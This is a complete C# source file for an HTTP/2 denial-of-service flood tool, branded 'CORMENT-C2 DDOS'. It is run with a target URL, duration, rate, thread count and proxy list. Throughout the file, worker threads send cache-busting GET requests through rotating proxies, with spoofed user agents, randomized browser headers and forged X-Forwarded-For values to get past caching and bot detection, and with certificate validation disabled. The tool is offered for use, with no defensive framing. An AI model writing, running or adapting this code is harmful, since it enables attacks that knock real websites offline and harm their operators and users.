// Http2Flood.cs
// Compile: dotnet new console -n Http2Flood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <time> <rate> <threads> <proxyfile>

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Http2Flood
{
    static readonly Random _rand = new Random();
    static string _target;
    static int _durationSec;
    static int _ratePerThread;
    static int _threads;
    static string _proxyFile;
    static string[] _proxies;

    // Header collections (from original)
    static readonly string[] _acceptHeaders = {
        "*/*", "image/*", "image/webp,image/apng", "text/html",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "text/html; charset=utf-8", "application/json, text/plain, */*"
    };

    static readonly string[] _languageHeaders = {
        "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
        "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7",
        "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5",
        "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9",
        "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9",
        "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9",
        "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "zh-CN,zh;q=0.9"
    };

    static readonly string[] _encodingHeaders = {
        "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity"
    };

    static readonly string[] _cacheHeaders = {
        "max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0",
        "must-revalidate", "proxy-revalidate", "s-maxage=604800",
        "no-cache, no-store,private, max-age=0, must-revalidate",
        "no-cache, no-store,private, s-maxage=604800, must-revalidate",
        "no-cache, no-store,private, max-age=604800, must-revalidate"
    };

    static readonly string[] _fetchSite = { "same-origin", "same-site", "cross-site", "none" };
    static readonly string[] _fetchMode = { "navigate", "same-origin", "no-cors", "cors" };
    static readonly string[] _fetchDest = { "document", "sharedworker", "subresource", "unknown", "worker" };

    static readonly string[] _windowsVersions = {
        "Windows 1.01", "Windows 1.02", "Windows 1.03", "Windows 1.04", "Windows 2.01",
        "Windows 3.0", "Windows NT 3.1", "Windows NT 3.5", "Windows 95", "Windows 98",
        "Windows 2006", "Windows NT 4.0", "Windows 95 Edition", "Windows 98 Edition",
        "Windows Me", "Windows Business", "Windows XP", "Windows 7", "Windows 8",
        "Windows 10 version 1507", "Windows 10 version 1511", "Windows 10 version 1607",
        "Windows 10 version 1703"
    };

    static readonly string[] _winArch = {
        "x86-16", "x86-16, IA32", "IA-32", "IA-32, Alpha, MIPS", "IA-32, Alpha, MIPS, PowerPC",
        "Itanium", "x86_64", "IA-32, x86-64", "IA-32, x86-64, ARM64", "x86-64, ARM64",
        "ARMv4, MIPS, SH-3", "ARMv4", "ARMv5", "ARMv7"
    };

    static readonly string[] _winServer = {
        "2012 R2", "2019 R2", "2012 R2 Datacenter", "Server Blue", "Longhorn Server",
        "Whistler Server", "Shell Release", "Daytona", "Razzle", "HPC 2008"
    };

    static readonly string[] _ipOctets = { "110.0.0.0", "111.0.0.0", "112.0.0.0", "113.0.0.0", "114.0.0.0",
        "115.0.0.0", "116.0.0.0", "117.0.0.0", "118.0.0.0", "119.0.0.0" };

    static readonly string[] _ipOctets2 = { "120.0", "119.0", "118.0", "117.0", "116.0", "115.0", "114.0", "113.0", "112.0", "111.0" };
    static readonly string[] _ipOctets3 = { "105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0", "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0" };
    static readonly string[] _randomNums = { "221988", "1287172", "87238723", "8737283", "8238232", "63535464", "121212" };

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: Http2Flood <target> <time> <rate> <threads> <proxyfile>");
            return;
        }

        _target = args[0];
        _durationSec = int.Parse(args[1]);
        _ratePerThread = int.Parse(args[2]);
        _threads = int.Parse(args[3]);
        _proxyFile = args[4];

        if (!File.Exists(_proxyFile))
        {
            Console.WriteLine($"[ERROR] Proxy file not found: {_proxyFile}");
            return;
        }
        _proxies = File.ReadAllLines(_proxyFile)
            .Select(l => l.Trim())
            .Where(l => !string.IsNullOrEmpty(l) && !l.StartsWith('#'))
            .ToArray();

        if (_proxies.Length == 0)
        {
            Console.WriteLine("[ERROR] No proxies found.");
            return;
        }

        Console.WriteLine("═════════════════════════════════════════════════════════════");
        Console.WriteLine(" CORMENT-C2 DDOS ATTACK".ToUpper());
        Console.WriteLine("═════════════════════════════════════════════════════════════");
        Console.WriteLine($" >> Target       : {_target}");
        Console.WriteLine($" >> Duration     : {_durationSec} seconds");
        Console.WriteLine($" >> Rate         : {_ratePerThread} req/s");
        Console.WriteLine($" >> Threads      : {_threads}");
        Console.WriteLine($" >> Proxy File   : {_proxyFile}");
        Console.WriteLine("═════════════════════════════════════════════════════════════");
        Console.WriteLine($" [!] Attack launched successfully");
        Console.WriteLine("═════════════════════════════════════════════════════════════");
        Console.WriteLine("CORMENT-C2 DDOS | HIGH RQ/S GLORY CUSTOM".ToUpper());

        var cts = new CancellationTokenSource();
        var tasks = new Task[_threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < _threads; i++)
        {
            int id = i;
            counters[id] = 0;
            tasks[i] = Task.Run(() => Worker(id, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Attack finished.");
    }

    static async Task Worker(int id, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Pick random proxy
        string proxyStr = _proxies[_rand.Next(_proxies.Length)];
        var proxyParts = proxyStr.Split(':');
        if (proxyParts.Length != 2) return;

        var proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));

        var handler = new SocketsHttpHandler
        {
            Proxy = proxy,
            UseProxy = true,
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        using var client = new HttpClient(handler);
        var uri = new Uri(_target);
        string basePath = uri.PathAndQuery;
        if (string.IsNullOrEmpty(basePath)) basePath = "/";
        bool hasQuery = basePath.Contains('?');

        var sw = Stopwatch.StartNew();
        int intervalMs = 1000 / _ratePerThread;

        // Random values used across requests
        string randomIp = _ipOctets[_rand.Next(_ipOctets.Length)];
        string randomIp2 = _ipOctets2[_rand.Next(_ipOctets2.Length)];
        string randomIp3 = _ipOctets3[_rand.Next(_ipOctets3.Length)];
        string randomNum = _randomNums[_rand.Next(_randomNums.Length)];
        string winVer = _windowsVersions[_rand.Next(_windowsVersions.Length)];
        string winArch = _winArch[_rand.Next(_winArch.Length)];
        string winServer = _winServer[_rand.Next(_winServer.Length)];

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _durationSec)
        {
            string cacheBuster = $"{(hasQuery ? "&" : "?")}_={Guid.NewGuid():N}&r={_rand.Next(1000000)}";
            string requestUri = $"{uri.Scheme}://{uri.Host}{basePath}{cacheBuster}";

            using var request = new HttpRequestMessage(HttpMethod.Get, requestUri);

            // Random headers
            request.Headers.Add("accept", _acceptHeaders[_rand.Next(_acceptHeaders.Length)]);
            request.Headers.Add("accept-language", _languageHeaders[_rand.Next(_languageHeaders.Length)]);
            request.Headers.Add("accept-encoding", _encodingHeaders[_rand.Next(_encodingHeaders.Length)]);
            request.Headers.Add("cache-control", _cacheHeaders[_rand.Next(_cacheHeaders.Length)]);
            request.Headers.Add("pragma", "no-cache");
            request.Headers.Add("upgrade-insecure-requests", "1");
            request.Headers.Add("sec-fetch-mode", _fetchMode[_rand.Next(_fetchMode.Length)]);
            request.Headers.Add("sec-fetch-site", _fetchSite[_rand.Next(_fetchSite.Length)]);
            request.Headers.Add("sec-fetch-dest", _fetchDest[_rand.Next(_fetchDest.Length)]);
            request.Headers.Add("te", "trailers");
            request.Headers.Add("dnt", "1");

            // User-Agent (spoofed)
            string userAgent = $"/5.0 ({winVer}; {winServer}; {winArch} ; {randomNum} {randomIp2}) /Gecko/20100101 Edg/91.0.864.59 {randomIp2}";
            request.Headers.UserAgent.ParseAdd(userAgent);

            // Additional headers from original
            request.Headers.Add("origin", $"https://{uri.Host}");
            request.Headers.Add("source-ip", RandomString(5));
            request.Headers.Add("data-return", "false");
            request.Headers.Add("X-Forwarded-For", proxyParts[0]);
            request.Headers.Add("A-IM", "Feed");
            request.Headers.Add("Accept-Range", _rand.Next(2) == 0 ? "bytes" : "none");
            request.Headers.Add("Delta-Base", "12340001");

            try
            {
                using var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch
            {
                // Ignore errors
            }

            await Task.Delay(intervalMs, ct);
        }
    }

    static string RandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        return new string(Enumerable.Repeat(chars, length).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }
}
